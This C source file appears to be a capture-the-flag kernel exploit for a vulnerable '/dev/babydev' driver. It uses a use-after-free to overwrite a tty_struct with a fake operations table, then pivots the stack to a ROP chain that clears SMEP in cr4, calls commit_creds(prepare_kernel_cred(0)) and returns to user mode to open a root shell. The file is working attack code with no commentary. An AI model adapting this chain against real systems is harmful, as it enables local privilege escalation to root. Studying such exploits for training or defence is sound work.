#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define TTY_STRUCT_MAGIC 0x0000000100005401
#define prepare_kernel_cred_addr 0xffffffff810a1810
#define commit_creds_addr 0xffffffff810a1420

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

void get_shell()
{
	if(!getuid())
	{
	    system("/bin/sh");
	}
	else
	{
		puts("[-] uid != 0!");
	}
	exit(0);
}

void get_root()
{
    char* (*prepare_kernel_cred)(int) = prepare_kernel_cred_addr;
    void (*commit_creds)(char*) = commit_creds_addr;
    (*commit_creds)((*prepare_kernel_cred)(0));
}

void DEBUG()
{
	puts("[*] DEBUG:");
	getchar();
}

int main()
{
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	ioctl(fd1, 0x10001, 0x2e0);
	puts("[+] babydev.struct.device_buf_len == 0x2e0.");
	close(fd1);
	getchar();

	size_t lower_addr = (0xffffffff8100008a & 0xffffffff);
	size_t base = lower_addr & ~0xfff;
	if(mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
	{
		puts("[-] mmap error!");
		exit(0);
	}

	int i = 0;
	size_t rop[0x20] = {0};
	rop[i++] = 0xffffffff810d238d;					// pop rdi; ret; 
	rop[i++] = 0x6f0;								// cr4.smep = 0
	rop[i++] = 0xffffffff81004d80;					// mov cr4, rdi; pop rbp; ret;
	rop[i++] = base;									// dummy rbp
	rop[i++] = (size_t)get_root;
	rop[i++] = 0xffffffff81063694;					// swapgs; pop rbp; ret;
	rop[i++] = base;								// dummy rbp
	rop[i++] = 0xffffffff814e35ef;					// iretq; ret; 
	rop[i++] = (size_t)get_shell;					// rip
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = base + 0x10000;
	rop[i++] = user_ss;
	/* printf("rop addr: %p\n", rop); */
	memcpy(lower_addr, rop, sizeof(rop));
	
	size_t fake_tty_operations[13] = {0};
	fake_tty_operations[12] = 0xffffffff8100008a;		// ops -> ioctl: xchg eax, esp; ret; 

	int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	size_t fake_tty_struct[4] = {0};
	read(fd2, (char *)fake_tty_struct, 32);
	puts("[+] struct tty_struct is stored in fake_tty_struct now.");
	/* for(int i = 0; i < 4; i++) */
		/* printf("%p\n", fake_tty_struct[i]); */
	fake_tty_struct[3] = (size_t)fake_tty_operations;
	getchar();

	write(fd2, fake_tty_struct, 32);
	puts("[+] fake_tty_struct is wrote into struct tty_struct now.");
	getchar();

	DEBUG();
	// triger ops -> ioctl
	ioctl(fd_tty, 0, 0);
	return 0;
}
